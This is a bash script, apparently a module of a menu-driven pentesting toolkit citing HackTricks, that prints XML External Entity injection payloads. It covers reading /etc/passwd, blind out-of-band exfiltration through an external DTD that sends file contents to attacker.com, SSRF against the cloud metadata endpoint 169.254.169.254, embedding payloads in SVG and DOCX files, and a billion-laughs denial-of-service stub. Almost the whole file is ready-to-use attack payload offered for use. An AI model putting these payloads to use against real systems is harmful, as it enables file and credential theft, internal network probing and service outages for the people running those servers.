#!/bin/bash
# HackTricks Ref: xxe-xee-xml-external-entity
# Module: XML External Entity (XXE) Injection

echo -e "${C6}[WEB ATTACK: SERVER_XXE]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
echo -e "--------------------------------------------------"

echo -e "${C4}Select XXE Attack Vector:${NC}"
echo "1) Classic XXE (File Disclosure)"
echo "2) Blind XXE (Out-of-Band Exfiltration)"
echo "3) XXE to SSRF (Internal Probing)"
echo "4) XXE in File Uploads (SVG, DOCX, XLSX)"
echo "5) Denial of Service (Billion Laughs)"
echo "0) Exit"

read -p "Selection: " xxe_opt

case $xxe_opt in
    1)
        echo -e "\n${C2}[*] Classic XXE Payload:${NC}"
        echo '<?xml version="1.0" encoding="UTF-8"?>'
        echo '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
        echo '<root><user>&xxe;</user></root>'
        ;;
    2)
        echo -e "\n${C2}[*] Blind XXE (OOB):${NC}"
        echo "Use an external DTD to exfiltrate data via DNS/HTTP:"
        echo '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/out.dtd"> %xxe; ]>'
        echo -e "\n${C5}Content of out.dtd on attacker server:${NC}"
        echo '<!ENTITY % file SYSTEM "file:///etc/passwd">'
        echo '<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '"'http://attacker.com/?data=%file;'"'>">'
        echo "%eval; %exfiltrate;"
        ;;
    3)
        echo -e "\n${C2}[*] XXE to SSRF:${NC}"
        echo "Probe internal network from the server's perspective:"
        echo '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>'
        echo '<root>&xxe;</root>'
        ;;
    4)
        echo -e "\n${C2}[*] XXE in Common File Formats:${NC}"
        echo " - SVG: Embed the payload in the <svg> tag."
        echo " - DOCX/XLSX: Inject into word/document.xml or [Content_Types].xml."
        echo " - PDF: If generated from HTML/XML templates."
        ;;
    5)
        echo -e "\n${C2}[*] Billion Laughs (DoS):${NC}"
        echo "Recursive entity expansion to exhaust server RAM:"
        echo '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;...">'
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
